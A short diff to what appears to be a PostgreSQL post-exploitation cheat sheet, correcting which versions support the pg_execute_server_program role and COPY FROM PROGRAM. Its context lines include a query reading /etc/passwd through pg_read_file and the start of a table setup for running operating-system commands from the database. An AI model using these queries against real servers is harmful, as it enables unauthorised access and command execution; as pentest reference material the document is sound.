@@ -86,7 +86,7 @@ SELECT current_setting('is_superuser');
 SELECT rolname, rolsuper FROM pg_roles WHERE rolname = current_user;
 SELECT pg_read_file('/etc/passwd');
 ```
-Superuser or `pg_execute_server_program` (PG 9.3+):
+Superuser, or the `pg_execute_server_program` role (PG 11+). `COPY ... FROM PROGRAM` itself needs PG 9.3+:
 ```sql
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec(cmd_output text);
